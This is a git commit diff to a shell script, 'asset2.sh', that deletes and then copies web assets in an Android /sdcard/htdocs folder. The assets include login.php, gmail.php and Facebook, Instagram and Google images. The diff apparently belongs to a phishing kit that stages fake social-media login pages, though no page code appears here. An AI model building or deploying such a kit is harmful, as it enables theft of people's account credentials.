b8c2a2c4308184d7b26a5c66e8c4d87e6d759d95
Philiphackerzx <65859306+Philiphackerzx@users.noreply.github.com>
2020-05-26 02:44:42 +0530

    Update asset2.sh

--- asset2.sh
+++ asset2.sh
@@ -1,4 +1,18 @@
 rm /sdcard/htdocs/index.php
+rm /sdcard/htdocs/insta.ttf
+rm /sdcard/htdocs/favicon.png
+rm /sdcard/htdocs/fb.png
+rm /sdcard/htdocs/action.php
+rm /sdcard/htdocs/arrow.png
+rm /sdcard/htdocs/instagram.png
+rm /sdcard/htdocs/style.css
+rm -rf /sdcard/htdocs/fb
+rm /sdcard/htdocs/google.ttf
+rm /sdcard/htdocs/login.php
+rm /sdcard/htdocs/google.png
+rm /sdcard/htdocs/gmail.php
+rm /sdcard/htdocs/facebook.ttf
+rm /adcard/htdocs/mobile.png
 cd asset
 cd icode
 cp insta.ttf /sdcard/htdocs
